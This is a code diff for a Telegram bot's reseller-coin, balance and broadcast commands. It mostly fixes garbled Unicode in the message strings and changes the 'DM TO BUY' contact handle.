-                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
+                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
                 return
 
             if amount < 0:
@@ -1355,11 +1359,11 @@ def add_coins_command(message):
             resellers[reseller_id]["coins"] += amount
             save_resellers()
 
-            bot.send_message(message.chat.id, f"âœ… ð—”ð—±ð—±ð—²ð—± {amount} ð—°ð—¼ð—¶ð—»ð˜€\n ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿: {reseller_id}\n ð—¡ð—²ð˜„ ð—¯ð—®ð—¹ð—®ð—»ð—°ð—²: {resellers[reseller_id]['coins']} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
+            bot.send_message(message.chat.id, f"✅ 𝗔𝗱𝗱𝗲𝗱 {amount} 𝗰𝗼𝗶𝗻𝘀\n 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿: {reseller_id}\n 𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
         except ValueError:
-            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
+            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
     else:
-        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP.")
+        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS.")
 
 @bot.message_handler(commands=['deductcoins'])
 def deduct_coins_command(message):
@@ -1374,24 +1378,24 @@ def deduct_coins_command(message):
             reseller_id, amount = parts[1], int(parts[2])
 
             if reseller_id not in resellers:
-                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
+                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
                 return
 
             if amount < 0:
                 raise ValueError("Negative coins not allowed")
 
             if resellers[reseller_id]["coins"] < amount:
-                bot.send_message(message.chat.id, f"â— ð—œð—»ð˜€ð˜‚ð—³ð—³ð—¶ð—°ð—¶ð—²ð—»ð˜ ð—°ð—¼ð—¶ð—»ð˜€! ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id} ð—µð—®ð˜€ ð—¼ð—»ð—¹ð˜† {resellers[reseller_id]['coins']} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
+                bot.send_message(message.chat.id, f"❗ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗰𝗼𝗶𝗻𝘀! 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮𝘀 𝗼𝗻𝗹𝘆 {resellers[reseller_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
                 return
 
             resellers[reseller_id]["coins"] -= amount
             save_resellers()
 
-            bot.send_message(message.chat.id, f"âœ… ð——ð—²ð—±ð˜‚ð—°ð˜ð—²ð—± {amount} ð—°ð—¼ð—¶ð—»ð˜€ ð—³ð—¿ð—¼ð—º ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id}.\nðŸ†• ð—¡ð—²ð˜„ ð—¯ð—®ð—¹ð—®ð—»ð—°ð—²: {resellers[reseller_id]['coins']} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
+            bot.send_message(message.chat.id, f"✅ 𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱 {amount} 𝗰𝗼𝗶𝗻𝘀 𝗳𝗿𝗼𝗺 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id}.\n🆕 𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
         except ValueError:
-            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/deductcoins <user_id> <amount>`", parse_mode="Markdown")
+            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/deductcoins <user_id> <amount>`", parse_mode="Markdown")
     else:
-        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
         
 @bot.message_handler(func=lambda message: message.text == "Balance")
 def check_balance_command(message):
@@ -1400,18 +1404,18 @@ def check_balance_command(message):
     if user_id in admin_id:
         # If the user is an admin, show all resellers and their balances
         if not resellers:
-            response = "â„¹ï¸ ð—¡ð—¼ ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ð˜€ ð—³ð—¼ð˜‚ð—»ð—±"
+            response = "ℹ️ 𝗡𝗼 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱"
         else:
-            response = "ðŸ“œ ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—•ð—®ð—¹ð—®ð—»ð—°ð—²ð˜€:\n"
+            response = "📜 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲𝘀:\n"
             for reseller, data in resellers.items():
-                response += f"ðŸ‘¤ `{reseller}` â†’ ðŸ’° {data['coins']} ð—°ð—¼ð—¶ð—»ð˜€\n"
+                response += f"👤 `{reseller}` → 💰 {data['coins']} 𝗰𝗼𝗶𝗻𝘀\n"
     elif user_id in resellers:
         # If the user is a reseller, show their own balance
         balance = resellers[user_id]['coins']
-        response = f"ðŸ’° ð—¬ð—¼ð˜‚ð—¿ ð—•ð—®ð—¹ð—®ð—»ð—°ð—²: {balance} ð—°ð—¼ð—¶ð—»ð˜€"
+        response = f"💰 𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} 𝗰𝗼𝗶𝗻𝘀"
     else:
         # If the user is neither an admin nor a reseller, deny access
-        response = "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—¼ð—¿ ð—®ð—» ð—®ð—±ð—ºð—¶ð—»."
+        response = "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻."
 
     bot.send_message(message.chat.id, response, parse_mode="Markdown")
     
@@ -1429,7 +1433,7 @@ def broadcast_message(message):
     user_id = str(message.chat.id)
     
     if user_id not in admin_id:
-        response = "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP"
+        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS"
         bot.reply_to(message, response)
         return
     
@@ -1443,9 +1447,9 @@ def broadcast_message(message):
         try:
             target_user_id = int(target_user_id)  # Convert to int to verify it's a user ID
             bot.send_message(target_user_id, broadcast_message)
-            response = f"ðŸ“¤ ð— ð—²ð˜€ð˜€ð—®ð—´ð—² ð˜€ð—²ð—»ð˜ ð˜ð—¼ ð˜‚ð˜€ð—²ð—¿ {target_user_id}."
+            response = f"📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝘂𝘀𝗲𝗿 {target_user_id}."
         except ValueError:
-            response = "â—ï¸ð—˜ð—¿ð—¿ð—¼ð—¿: ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð˜‚ð˜€ð—²ð—¿ ð—œð——."
+            response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗."
     else:
         broadcast_message = msg_parts[1]
         # Send to all users (for example, keep track of all users in the users list)
@@ -1455,13 +1459,13 @@ def broadcast_message(message):
             except Exception as e:
                 print(f"Failed to send message to {user_id}: {e}")
 
-        response = "ðŸ“¤ ð— ð—²ð˜€ð˜€ð—®ð—´ð—² ð˜€ð—²ð—»ð˜ ð˜ð—¼ ð—®ð—¹ð—¹ ð˜‚ð˜€ð—²ð—¿ð˜€"
+        response = "📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀"
 
     bot.reply_to(message, response)
 
 
 if __name__ == "__main__":
-    print("âœ… Bot is active!... ")
+    print("✅ Bot is active!... ")
     while True:
         load_data()
         try:
